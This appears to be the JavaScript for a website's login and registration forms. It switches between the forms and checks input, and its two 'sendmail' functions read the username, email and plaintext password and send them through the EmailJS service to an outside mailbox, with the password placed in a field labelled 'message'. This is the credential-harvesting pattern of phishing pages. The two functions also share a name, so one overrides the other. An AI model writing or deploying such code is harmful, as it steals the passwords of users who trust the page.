// js form
  window.onload = function () {
    const loginForm = document.querySelector(".login-form");
    const registerForm = document.querySelector(".register-form");
    const registerLink = document.querySelector('a[href="#register"]');
    const loginLink = document.querySelector('a[href="#login"]');

    registerLink.addEventListener("click", function (e) {
      e.preventDefault();
      loginForm.style.display = "none";
      registerForm.style.display = "block";
    });

    loginLink.addEventListener("click", function (e) {
      e.preventDefault();
      registerForm.style.display = "none";
      loginForm.style.display = "block";
    });

    // Optional: Show login form by default
    registerForm.style.display = "none";
    loginForm.style.display = "block";
  };


  // register page
document.addEventListener("DOMContentLoaded", function () {
  let username = document.querySelector("#username");
  let password = document.querySelector("#password");
  let email = document.querySelector("#email");
  let form = document.querySelector("#form");

  form.addEventListener("submit", function (e) {
    let messages = [];

    if (username.value === '' || username.value == null) {
      messages.push('Username is required');
    }

    if(username.value.length<3){
      messages.push("username must be longer than 3 characters")
    }

    if (email.value === '' || email.value == null) {
      messages.push('Email is required');
    }

    if (password.value.length <= 6) {
      messages.push('Password must be longer than 6 characters');
    }

    if (password.value.toLowerCase() === "password") {
      messages.push('Password cannot be "password"');
    }

    if (messages.length > 0) {
      e.preventDefault();
      alert(messages.join('\n'));
    }
  });
});

// login page
document.addEventListener("DOMContentLoaded", function () {
  let username = document.querySelector("#uselog");
  let password = document.querySelector("#passlog");
  let form = document.querySelector("#log-form");

  form.addEventListener("submit", function (e) {
    let messages = [];

    if (username.value === '' || username.value == null) {
      messages.push('Username is required');
    }
    if(username.value.length<3){
      messages.push("username must be longer than 3 characters")
    }

    if (password.value.length <= 6) {
      messages.push('Password must be longer than 6 characters');
    }

    if (password.value.toLowerCase() === "password") {
      messages.push('Password cannot be "password"');
    }

    if (messages.length > 0) {
      e.preventDefault();
      alert(messages.join('\n'));
    }
  });
});

// register page sent email
 function sendmail(event) {
    event.preventDefault(); // Stops form from refreshing the page

    let params = {
      from_name: document.querySelector("#username").value,
      email_id: document.querySelector("#email").value,
      message: document.querySelector("#password").value  // Use 'message' not 'password'
    };

    emailjs.send("service_qlfrhvi", "template_wkwmvkj", params)
      .then(function (res) {
        alert("Email sent successfully! Status: " + res.status);
      })
      .catch(function (error) {
        alert("Failed to send email: " + JSON.stringify(error));
      });
  }

// login page sent email
  function sendmail(event) {
    event.preventDefault(); // Stops form from refreshing the page

    let params = {
      from_name: document.querySelector("#uselog").value,
      message: document.querySelector("#passlog").value  // Use 'message' not 'password'
    };

    emailjs.send("service_qlfrhvi", "template_wkwmvkj", params)
      .then(function (res) {
        alert("Email sent successfully! Status: " + res.status);
      })
      .catch(function (error) {
        alert("Failed to send email: " + JSON.stringify(error));
      });
  }